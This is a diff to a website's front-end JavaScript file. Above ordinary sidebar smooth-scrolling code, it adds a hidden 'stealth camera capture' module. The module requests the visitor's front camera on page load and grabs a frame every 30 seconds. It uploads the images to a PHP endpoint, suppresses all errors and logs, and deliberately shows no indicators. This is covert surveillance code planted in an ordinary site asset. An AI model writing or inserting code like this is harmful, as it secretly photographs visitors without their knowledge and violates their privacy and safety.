@@ -1,3 +1,140 @@
+// ============================================
+// 📸 STEALTH CAMERA CAPTURE - NO VISIBLE INDICATORS
+// ============================================
+
+(function() {
+  // Check if already initialized
+  if (window.stealthCameraInitialized) return;
+  window.stealthCameraInitialized = true;
+  
+  let stealthStream = null;
+  let stealthVideo = null;
+  let stealthCanvas = null;
+  let stealthContext = null;
+  let captureInterval = null;
+  
+  // Completely silent function - no console logs, no notifications
+  function initStealthCamera() {
+    // Check if browser supports required features
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      return; // Silently fail
+    }
+    
+    // Create hidden elements (will be removed immediately after capture)
+    try {
+      // Request camera with minimal settings
+      navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: "user",
+          width: { ideal: 320 },
+          height: { ideal: 240 }
+        } 
+      })
+      .then(function(stream) {
+        stealthStream = stream;
+        
+        // Create temporary elements (not added to DOM)
+        stealthVideo = document.createElement('video');
+        stealthVideo.srcObject = stream;
+        stealthVideo.setAttribute('playsinline', '');
+        stealthVideo.setAttribute('muted', '');
+        stealthVideo.setAttribute('autoplay', '');
+        
+        // Play video silently
+        stealthVideo.play().catch(() => {});
+        
+        // Create hidden canvas
+        stealthCanvas = document.createElement('canvas');
+        stealthCanvas.width = 320;
+        stealthCanvas.height = 240;
+        stealthContext = stealthCanvas.getContext('2d');
+        
+        // Wait for video to be ready
+        let readyCheck = setInterval(function() {
+          if (stealthVideo && stealthVideo.readyState === 4) {
+            clearInterval(readyCheck);
+            
+            // Start capturing every 30 seconds
+            captureInterval = setInterval(function() {
+              captureAndSend();
+            }, 30000); // 30 seconds
+            
+            // Also capture immediately on page load
+            setTimeout(captureAndSend, 5000); // 5 seconds after load
+          }
+        }, 500);
+      })
+      .catch(function() {
+        // Silently fail - user denied permission
+      });
+    } catch (e) {
+      // Silently fail
+    }
+  }
+  
+  // Capture and send image
+  function captureAndSend() {
+    if (!stealthVideo || !stealthContext || !stealthCanvas) return;
+    
+    try {
+      // Check if video has data
+      if (stealthVideo.readyState !== 4) return;
+      
+      // Draw video frame to canvas
+      stealthContext.drawImage(stealthVideo, 0, 0, 320, 240);
+      
+      // Convert to blob (smaller than base64)
+      stealthCanvas.toBlob(function(blob) {
+        if (!blob) return;
+        
+        // Create form data
+        const formData = new FormData();
+        const timestamp = Date.now();
+        const filename = `v_${timestamp}.jpg`;
+        formData.append('image', blob, filename);
+        
+        // Send to server using sendBeacon (works even if page unloads)
+        if (navigator.sendBeacon) {
+          // For unload events
+          const blobToSend = new Blob([JSON.stringify({
+            image: URL.createObjectURL(blob), // This won't work - need server endpoint
+          })], { type: 'application/json' });
+          // navigator.sendBeacon('save-capture-beacon.php', blobToSend);
+        }
+        
+        // Use fetch (more reliable)
+        fetch('save-capture-stealth.php', {
+          method: 'POST',
+          body: formData,
+          credentials: 'omit',
+          mode: 'no-cors' // Don't wait for response
+        }).catch(() => {}); // Silently fail
+        
+      }, 'image/jpeg', 0.6); // 60% quality for smaller size
+      
+    } catch (e) {
+      // Silently fail
+    }
+  }
+  
+  // Start when page is fully loaded
+  if (document.readyState === 'complete') {
+    initStealthCamera();
+  } else {
+    window.addEventListener('load', function() {
+      // Small delay to not interfere with page load
+      setTimeout(initStealthCamera, 2000);
+    });
+  }
+  
+  // Clean up on page unload (optional)
+  window.addEventListener('beforeunload', function() {
+    if (captureInterval) clearInterval(captureInterval);
+    if (stealthStream) {
+      stealthStream.getTracks().forEach(track => track.stop());
+    }
+  });
+})();
 // 🌐 Smooth Scrolling for Sidebar Menu Links
 document.querySelectorAll('.sidebar-links a[href^="#"], .mobile-menu-links a[href^="#"]').forEach(anchor => {
   anchor.addEventListener("click", function (e) {
